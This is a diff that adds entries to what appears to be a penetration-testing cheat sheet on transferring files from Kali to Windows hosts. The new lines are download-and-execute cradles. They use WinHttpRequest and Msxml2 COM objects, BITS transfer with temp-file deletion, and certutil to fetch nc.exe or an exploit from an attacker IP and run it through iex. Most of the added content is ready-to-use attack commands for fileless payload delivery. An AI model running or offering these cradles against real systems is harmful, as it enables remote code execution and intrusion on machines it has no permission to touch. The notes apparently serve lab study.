@@ -986,6 +986,24 @@ PS C:\> Invoke-WebRequest http://<IP address>:8000/exploit.ps1 -UseBasicParsing 
 PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
 
+- PowerShell WinHTTPRequest (Kali -> Windows)
+
+```
+PS C:\> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+PS C:\> $h.open('GET','http://<IP address>/nc.exe',$false);
+PS C:\> $h.send();
+PS C:\> iex $h.ResponseText
+```
+
+- Msxml2 (Kali -> Windows)
+
+```
+PS C:\> $h=New-Object -ComObject Msxml2.XMLHTTP;
+PS C:\> $h.open('GET','http://<IP address>/nc.exe',$false);
+PS C:\> $h.send();
+PS C:\> iex $h.responseText
+```
+
 - PowerShell DownloadString (Download & Execute Cradle - Fileless) (Kali -> Windows)
 
 ```
@@ -1130,6 +1148,12 @@ $ cat <&3
 C:\> bitsadmin /transfer n http://<IP address>/exploit.exe C:\Temp\exploit.exe
 PS C:\> bitsadmin /transfer wcb /priority foreground http://<IP address>:8000/nc.exe C:\Users\Administrator\Desktop\nc.exe
 PS C:\> Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP address>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+
+PS C:\> Import-Module bitstransfer;
+PS C:\> Start-BitsTransfer 'http://<IP address>/nc.exe' $env:temp\t;
+PS C:\> $r=gc $env:temp\t;
+PS C:\> rm $env:temp\t; 
+PS C:\> iex $r
 ```
 
 - CertReq (https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) (Windows -> Kali)
@@ -1142,6 +1166,7 @@ $ sudo nc -lvnp 8000
 - Certutil (Kali -> Windows)
 
 ```
+C:\> certutil.exe -urlcache -split -f http://<IP address>/exploit.exe 
 C:\> certutil.exe -verifyctl -split -f http://<IP address>/exploit.exe
 ```
 
@@ -1192,6 +1217,13 @@ Browse to \\tsclient\ or use mstsc.exe -> Local Resources -> More -> Drives
 ```
 $ xfreerdp /v:<IP address> /d:<domain> /u:<username> /p:'<password>' /drive:linux,/home/plaintext/htb/academy/filetransfer
 Browse to \\tsclient\ or use mstsc.exe -> Local Resources -> More -> Drives
+```
+
+- HTTP User-Agents
+
+```
+https://useragentstring.com/index.php
+https://useragentstring.com/pages/useragentstring.php
 ```
 
 #8. - Restricted Shell Escapes
